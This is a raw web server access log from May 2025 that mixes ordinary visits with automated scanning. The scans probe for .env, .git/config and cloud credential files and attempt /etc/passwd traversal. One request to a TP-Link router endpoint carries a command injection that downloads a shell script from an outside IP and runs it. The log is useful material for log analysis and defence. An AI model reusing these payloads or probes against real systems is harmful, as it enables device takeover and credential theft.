179.43.152.115 - - [09/May/2025:14:11:16 +0000] "GET /assets../.git/config HTTP/1.1" 404 134 "-" "l9explore/1.2.2"
179.43.152.115 - - [09/May/2025:14:11:17 +0000] "GET /.env.backup HTTP/1.1" 404 134 "-" "l9explore/1.2.2"
179.43.152.115 - - [09/May/2025:14:11:17 +0000] "GET /.env.ci HTTP/1.1" 404 134 "-" "l9explore/1.2.2"
179.43.152.115 - - [09/May/2025:14:11:18 +0000] "GET /.env.save HTTP/1.1" 404 134 "-" "l9explore/1.2.2"
179.43.152.115 - - [09/May/2025:14:11:18 +0000] "GET /prod/.env HTTP/1.1" 404 134 "-" "l9explore/1.2.2"
179.43.152.115 - - [09/May/2025:14:11:18 +0000] "GET /.env.dev HTTP/1.1" 404 134 "-" "l9explore/1.2.2"
179.43.152.115 - - [09/May/2025:14:11:19 +0000] "GET /.env.prod HTTP/1.1" 404 134 "-" "l9explore/1.2.2"
179.43.152.115 - - [09/May/2025:14:11:19 +0000] "GET /.env.production HTTP/1.1" 404 134 "-" "l9explore/1.2.2"
179.43.152.115 - - [09/May/2025:14:11:19 +0000] "GET /.env.qa HTTP/1.1" 404 134 "-" "l9explore/1.2.2"
179.43.152.115 - - [09/May/2025:14:11:20 +0000] "GET /server/.git/config HTTP/1.1" 404 134 "-" "l9explore/1.2.2"
179.43.152.115 - - [09/May/2025:14:11:20 +0000] "GET /src/.git/config HTTP/1.1" 404 134 "-" "l9explore/1.2.2"
179.43.152.115 - - [09/May/2025:14:11:20 +0000] "GET /config.json HTTP/1.1" 404 134 "-" "l9explore/1.2.2"
179.43.152.115 - - [09/May/2025:14:11:21 +0000] "GET /.env.secret HTTP/1.1" 404 134 "-" "l9explore/1.2.2"
179.43.152.115 - - [09/May/2025:14:11:21 +0000] "GET /.env.stage HTTP/1.1" 404 134 "-" "l9explore/1.2.2"
179.43.152.115 - - [09/May/2025:14:11:21 +0000] "GET /docker-compose.prod.yml HTTP/1.1" 404 134 "-" "l9explore/1.2.2"
179.43.152.115 - - [09/May/2025:14:11:22 +0000] "GET /.env.dist HTTP/1.1" 404 134 "-" "l9explore/1.2.2"
179.43.152.115 - - [09/May/2025:14:11:22 +0000] "GET /configuration/.env HTTP/1.1" 404 134 "-" "l9explore/1.2.2"
179.43.152.115 - - [09/May/2025:14:11:23 +0000] "GET /app/.git/config HTTP/1.1" 404 134 "-" "l9explore/1.2.2"
179.43.152.115 - - [09/May/2025:14:11:23 +0000] "GET /api/.git/config HTTP/1.1" 404 134 "-" "l9explore/1.2.2"
179.43.152.115 - - [09/May/2025:14:11:23 +0000] "GET /media/.git/config HTTP/1.1" 404 134 "-" "l9explore/1.2.2"
179.43.152.115 - - [09/May/2025:14:11:24 +0000] "GET /.env.template HTTP/1.1" 404 134 "-" "l9explore/1.2.2"
179.43.152.115 - - [09/May/2025:14:11:24 +0000] "GET /core/.git/config HTTP/1.1" 404 134 "-" "l9explore/1.2.2"
179.43.152.115 - - [09/May/2025:14:11:24 +0000] "GET /.git/config HTTP/1.1" 404 134 "-" "l9explore/1.2.2"
179.43.152.115 - - [09/May/2025:14:11:25 +0000] "GET /.env.default HTTP/1.1" 404 134 "-" "l9explore/1.2.2"
179.43.152.115 - - [09/May/2025:14:11:25 +0000] "GET /settings/.env HTTP/1.1" 404 134 "-" "l9explore/1.2.2"
179.43.152.115 - - [09/May/2025:14:11:25 +0000] "GET /.env.testing HTTP/1.1" 404 134 "-" "l9explore/1.2.2"
179.43.152.115 - - [09/May/2025:14:11:26 +0000] "GET /backup/.git/config HTTP/1.1" 404 134 "-" "l9explore/1.2.2"
179.43.152.115 - - [09/May/2025:14:11:26 +0000] "GET /www/.git/config HTTP/1.1" 404 134 "-" "l9explore/1.2.2"
179.43.152.115 - - [09/May/2025:14:11:27 +0000] "GET /.env.test HTTP/1.1" 404 134 "-" "l9explore/1.2.2"
179.43.152.115 - - [09/May/2025:14:11:27 +0000] "GET /files/.git/config HTTP/1.1" 404 134 "-" "l9explore/1.2.2"
179.43.152.115 - - [09/May/2025:14:11:27 +0000] "GET /project/.git/config HTTP/1.1" 404 134 "-" "l9explore/1.2.2"
179.43.152.115 - - [09/May/2025:14:11:28 +0000] "GET /.env.dev.local HTTP/1.1" 404 134 "-" "l9explore/1.2.2"
179.43.152.115 - - [09/May/2025:14:11:28 +0000] "GET /.env.live HTTP/1.1" 404 134 "-" "l9explore/1.2.2"
179.43.152.115 - - [09/May/2025:14:11:28 +0000] "GET /.env.production.local HTTP/1.1" 404 134 "-" "l9explore/1.2.2"
179.43.152.115 - - [09/May/2025:14:11:29 +0000] "GET /api/.env HTTP/1.1" 404 134 "-" "l9explore/1.2.2"
179.43.152.115 - - [09/May/2025:14:11:29 +0000] "GET /.env.uat HTTP/1.1" 404 134 "-" "l9explore/1.2.2"
179.43.152.115 - - [09/May/2025:14:11:29 +0000] "GET /public/.git/config HTTP/1.1" 404 134 "-" "l9explore/1.2.2"
179.43.152.115 - - [09/May/2025:14:11:30 +0000] "GET /static../.git/config HTTP/1.1" 404 134 "-" "l9explore/1.2.2"
179.43.152.115 - - [09/May/2025:14:11:30 +0000] "GET /dev/.git/config HTTP/1.1" 404 134 "-" "l9explore/1.2.2"
179.43.152.115 - - [09/May/2025:14:11:30 +0000] "GET /.env_sample HTTP/1.1" 404 134 "-" "l9explore/1.2.2"
179.43.152.115 - - [09/May/2025:14:11:31 +0000] "GET /.env.development.local HTTP/1.1" 404 134 "-" "l9explore/1.2.2"
179.43.152.115 - - [09/May/2025:14:11:31 +0000] "GET /.env.staging.local HTTP/1.1" 404 134 "-" "l9explore/1.2.2"
179.43.152.115 - - [09/May/2025:14:11:32 +0000] "GET /.env.testing.local HTTP/1.1" 404 134 "-" "l9explore/1.2.2"
179.43.152.115 - - [09/May/2025:14:11:32 +0000] "GET /config/.git/config HTTP/1.1" 404 134 "-" "l9explore/1.2.2"
179.43.152.115 - - [09/May/2025:14:11:32 +0000] "GET /.env.bak HTTP/1.1" 404 134 "-" "l9explore/1.2.2"
179.43.152.115 - - [09/May/2025:14:11:33 +0000] "GET /.env.sandbox HTTP/1.1" 404 134 "-" "l9explore/1.2.2"
179.43.152.115 - - [09/May/2025:14:11:33 +0000] "GET /build/.env HTTP/1.1" 404 134 "-" "l9explore/1.2.2"
179.43.152.115 - - [09/May/2025:14:11:33 +0000] "GET /media../.git/config HTTP/1.1" 404 134 "-" "l9explore/1.2.2"
154.81.156.35 - - [09/May/2025:14:12:22 +0000] "GET / HTTP/1.1" 200 612 "-" "curl/7.81.0"
195.211.191.76 - - [09/May/2025:14:15:38 +0000] "GET /.git/refs/ HTTP/1.1" 404 197 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.158 Safari/537.36 Vivaldi/2.5.1525.43"
154.81.156.7 - - [07/May/2025:08:16:56 +0000] "GET / HTTP/1.1" 200 612 "-" "-"
185.218.86.4 - - [07/May/2025:08:22:43 +0000] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
45.156.131.24 - - [07/May/2025:08:33:34 +0000] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
93.174.93.12 - - [07/May/2025:08:39:26 +0000] "GET / HTTP/1.0" 200 612 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36"
152.53.248.175 - - [07/May/2025:08:45:16 +0000] "CONNECT www.google.com:443 HTTP/1.1" 400 166 "-" "-"
93.174.93.12 - - [07/May/2025:08:47:38 +0000] "\x16\x03\x02\x01o\x01\x00\x01k\x03\x02RH\xC5\x1A#\xF7:N\xDF\xE2\xB4\x82/\xFF\x09T\x9F\xA7\xC4y\xB0h\xC6\x13\x8C\xA4\x1C=\x22\xE1\x1A\x98 \x84\xB4,\x85\xAFn\xE3Y\xBBbhl\xFF(=':\xA9\x82\xD9o\xC8\xA2\xD7\x93\x98\xB4\xEF\x80\xE5\xB9\x90\x00(\xC0" 400 166 "-" "-"
154.81.156.35 - - [07/May/2025:08:58:54 +0000] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
43.159.152.187 - - [07/May/2025:09:04:38 +0000] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
141.98.11.128 - - [07/May/2025:09:24:13 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+sh%3B+wget+http%3A%2F%2F212.81.47.226%2Fsh%3B+chmod+777+sh%3B+.%2Fsh+tplink%3B+rm+-rf+sh%60) HTTP/1.1" 404 162 "-" "Go-http-client/1.1"
185.218.84.178 - - [07/May/2025:09:28:06 +0000] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
154.81.156.7 - - [07/May/2025:09:32:12 +0000] "GET / HTTP/1.1" 200 612 "-" "-"
122.173.31.204 - - [07/May/2025:09:43:29 +0000] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0"
122.173.31.204 - - [07/May/2025:09:43:29 +0000] "GET /favicon.ico HTTP/1.1" 404 134 "http://ai-log-analyser.eastasia.cloudapp.azure.com/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0"
185.242.226.115 - - [07/May/2025:09:49:18 +0000] "\x16\x03\x01\x00\x8A\x01\x00\x00\x86\x03\x032MV\xADX3k\xED\xEC\xB6$d\xF9\x9B\xC6\xF2$\x0C\x11\xBE\xB0\xC4%\x12\x8F\xFB\xBC\xCF\xB9\x0C{\x5C\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 166 "-" "-"
122.173.31.204 - - [07/May/2025:10:11:37 +0000] "GET / HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0"
122.173.31.204 - - [07/May/2025:10:11:37 +0000] "GET / HTTP/1.1" 304 0 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0"
122.173.31.204 - - [07/May/2025:10:13:49 +0000] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0"
176.65.148.227 - - [07/May/2025:10:16:14 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 134 "http://20.255.50.20:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
176.65.148.227 - - [07/May/2025:10:16:14 +0000] "" 400 0 "-" "-"
154.81.156.7 - - [07/May/2025:10:55:25 +0000] "GET / HTTP/1.1" 200 612 "-" "-"
195.184.76.76 - - [07/May/2025:11:17:16 +0000] "\x16\x03\x03\x01\xA5\x01\x00\x01\xA1\x03\x03\xD8\xC8@" 400 166 "-" "-"
195.184.76.76 - - [07/May/2025:11:17:19 +0000] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0"
49.51.253.83 - - [07/May/2025:11:22:57 +0000] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
185.218.86.4 - - [07/May/2025:11:28:26 +0000] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
122.173.31.204 - - [07/May/2025:11:34:28 +0000] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0"
122.173.31.204 - - [07/May/2025:11:34:28 +0000] "GET /favicon.ico HTTP/1.1" 404 134 "http://ai-log-analyser.eastasia.cloudapp.azure.com/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0"
122.173.31.204 - - [07/May/2025:11:34:59 +0000] "GET / HTTP/1.1" 502 166 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0"
122.173.31.204 - - [07/May/2025:11:35:02 +0000] "GET / HTTP/1.1" 502 166 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0"
154.81.156.35 - - [07/May/2025:11:37:39 +0000] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
122.173.31.204 - - [07/May/2025:11:39:12 +0000] "GET / HTTP/1.1" 200 51 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0"
122.173.31.204 - - [07/May/2025:11:39:13 +0000] "GET /favicon.ico HTTP/1.1" 404 184 "http://ai-log-analyser.eastasia.cloudapp.azure.com/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0"
15.204.37.20 - - [07/May/2025:11:39:16 +0000] "GET /favicon.ico HTTP/1.1" 404 162 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0"
122.173.31.204 - - [07/May/2025:11:39:51 +0000] "GET / HTTP/1.1" 200 51 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0"
3.129.17.51 - - [07/May/2025:12:01:00 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x03\xEE\x04w\xE6DT7\x1D\xF9\x9BD\xBFc\xE5\xD2 ckz\xC4\x88i\xF5\x13#\x97e\xBC/\xFC\x91\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 166 "-" "-"
3.129.17.51 - - [07/May/2025:12:02:56 +0000] "SSH-2.0-Go" 400 166 "-" "-"
45.33.14.197 - - [07/May/2025:12:17:58 +0000] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 zgrab/0.x"
185.218.84.178 - - [07/May/2025:12:18:17 +0000] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
13.59.105.79 - - [07/May/2025:12:26:00 +0000] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36"
13.59.105.79 - - [07/May/2025:12:29:11 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x80\xD6x\xB3/\xE7U\xA5\x80\xEC\x82t\xFD$\x05\xB6\xB3>\x0F\xEE5\xA3\x94u\x83\x88\x22H\xBA\xDF5e\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 166 "-" "-"
13.59.105.79 - - [07/May/2025:12:31:10 +0000] "" 400 0 "-" "-"
13.59.105.79 - - [07/May/2025:12:31:58 +0000] "SSH-2.0-Go" 400 166 "-" "-"
122.173.31.204 - - [07/May/2025:12:31:59 +0000] "GET / HTTP/1.1" 200 51 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0"
122.173.31.204 - - [07/May/2025:12:32:00 +0000] "GET /favicon.ico HTTP/1.1" 404 184 "http://ai-log-analyser.eastasia.cloudapp.azure.com/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0"
87.125.242.11 - - [07/May/2025:12:32:23 +0000] "GET / HTTP/1.1" 200 612 "-" "Hello-World/1.0"
87.125.242.11 - - [07/May/2025:12:32:23 +0000] "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" 400 166 "-" "-"
13.59.105.79 - - [07/May/2025:12:33:20 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x09\xBD\xC5\x1E\xAE\xAF\x99\xE9\x16\xC7\xB4E\x22\xAF\x90\xC5" 400 166 "-" "-"
35.240.66.201 - - [07/May/2025:12:35:43 +0000] "GET / HTTP/1.1" 200 396 "-" "python-requests/2.32.3"
122.173.31.204 - - [07/May/2025:12:38:37 +0000] "GET / HTTP/1.1" 200 51 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
122.173.31.204 - - [07/May/2025:12:38:37 +0000] "GET /favicon.ico HTTP/1.1" 404 184 "http://ai-log-analyser.eastasia.cloudapp.azure.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
122.173.31.204 - - [07/May/2025:12:39:15 +0000] "GET / HTTP/1.1" 200 51 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
122.173.31.204 - - [07/May/2025:12:39:18 +0000] "GET / HTTP/1.1" 200 51 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0"
152.58.103.175 - - [07/May/2025:12:40:28 +0000] "GET / HTTP/1.1" 200 51 "-" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36"
152.58.103.175 - - [07/May/2025:12:40:30 +0000] "GET /favicon.ico HTTP/1.1" 404 184 "http://ai-log-analyser.eastasia.cloudapp.azure.com/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36"
122.173.31.204 - - [07/May/2025:12:41:02 +0000] "GET / HTTP/1.1" 200 51 "android-app://com.google.android.gm/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36"
122.173.31.204 - - [07/May/2025:12:41:02 +0000] "GET /favicon.ico HTTP/1.1" 404 184 "http://ai-log-analyser.eastasia.cloudapp.azure.com/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36"
106.196.55.183 - - [07/May/2025:12:41:18 +0000] "GET / HTTP/1.1" 200 51 "android-app://com.google.android.gm/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36"
106.196.55.183 - - [07/May/2025:12:41:21 +0000] "GET / HTTP/1.1" 200 51 "android-app://com.google.android.gm/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36"
106.196.55.183 - - [07/May/2025:12:41:23 +0000] "GET / HTTP/1.1" 200 51 "android-app://com.google.android.gm/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36"
106.196.55.183 - - [07/May/2025:12:41:25 +0000] "GET / HTTP/1.1" 200 51 "android-app://com.google.android.gm/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36"
152.58.103.175 - - [07/May/2025:12:42:56 +0000] "GET / HTTP/1.1" 200 51 "-" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36"
106.196.55.183 - - [07/May/2025:12:44:11 +0000] "GET / HTTP/1.1" 200 51 "android-app://com.google.android.gm/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36"
122.173.31.204 - - [07/May/2025:12:46:59 +0000] "GET / HTTP/1.1" 200 51 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0"
122.173.31.204 - - [07/May/2025:12:47:02 +0000] "GET / HTTP/1.1" 200 51 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0"
122.173.31.204 - - [07/May/2025:12:52:49 +0000] "GET / HTTP/1.1" 200 51 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0"
157.10.166.68 - - [07/May/2025:12:52:51 +0000] "GET / HTTP/1.1" 200 51 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
122.173.31.204 - - [07/May/2025:12:53:18 +0000] "GET / HTTP/1.1" 200 51 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0"
122.173.31.204 - - [07/May/2025:12:58:53 +0000] "GET / HTTP/1.1" 200 51 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0"
93.174.93.12 - - [07/May/2025:13:23:21 +0000] "\x16\x03\x02\x01o\x01\x00\x01k\x03\x02RH\xC5\x1A#\xF7:N\xDF\xE2\xB4\x82/\xFF\x09T\x9F\xA7\xC4y\xB0h\xC6\x13\x8C\xA4\x1C=\x22\xE1\x1A\x98 \x84\xB4,\x85\xAFn\xE3Y\xBBbhl\xFF(=':\xA9\x82\xD9o\xC8\xA2\xD7\x93\x98\xB4\xEF\x80\xE5\xB9\x90\x00(\xC0" 400 166 "-" "-"
154.81.156.7 - - [07/May/2025:13:47:20 +0000] "GET / HTTP/1.1" 200 612 "-" "-"
122.173.31.204 - - [07/May/2025:13:56:26 +0000] "GET / HTTP/1.1" 200 51 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0"
154.81.156.35 - - [07/May/2025:14:00:11 +0000] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
49.44.80.234 - - [07/May/2025:14:05:12 +0000] "GET / HTTP/1.1" 200 51 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
185.218.86.4 - - [07/May/2025:14:13:39 +0000] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
122.173.31.204 - - [07/May/2025:14:17:36 +0000] "GET / HTTP/1.1" 200 51 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0"
122.173.31.204 - - [07/May/2025:14:17:37 +0000] "GET /favicon.ico HTTP/1.1" 404 184 "http://ai-log-analyser.eastasia.cloudapp.azure.com/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0"
154.83.103.144 - - [07/May/2025:14:27:20 +0000] "GET /.git/HEAD HTTP/1.1" 404 134 "-" "-"
154.83.103.144 - - [07/May/2025:14:27:21 +0000] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
154.83.103.144 - - [07/May/2025:14:27:21 +0000] "GET /..%2f..%2f..%2fetc%2fpasswd HTTP/1.1" 400 166 "-" "-"
154.83.103.144 - - [07/May/2025:14:27:21 +0000] "GET /../../etc/passwd HTTP/1.1" 400 166 "-" "-"
154.83.103.144 - - [07/May/2025:14:27:22 +0000] "GET /.aws/credentials HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
154.83.103.144 - - [07/May/2025:14:27:22 +0000] "GET /.azure/ HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
154.83.103.144 - - [07/May/2025:14:27:22 +0000] "GET /.bash_history HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
154.83.103.144 - - [07/May/2025:14:27:22 +0000] "GET /.bash_profile HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
154.83.103.144 - - [07/May/2025:14:27:22 +0000] "GET /.bashrc HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
154.83.103.144 - - [07/May/2025:14:27:22 +0000] "GET /.boto HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
154.83.103.144 - - [07/May/2025:14:27:23 +0000] "GET /.bzr/ HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
154.83.103.144 - - [07/May/2025:14:27:23 +0000] "GET /.config/gcloud/ HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
154.83.103.144 - - [07/May/2025:14:27:23 +0000] "GET /.cshrc HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
154.83.103.144 - - [07/May/2025:14:27:23 +0000] "GET /.docker/config.json HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
154.83.103.144 - - [07/May/2025:14:27:23 +0000] "GET /.env HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
154.83.103.144 - - [07/May/2025:14:27:24 +0000] "GET /.env.backup HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
154.83.103.144 - - [07/May/2025:14:27:24 +0000] "GET /.env.dev HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
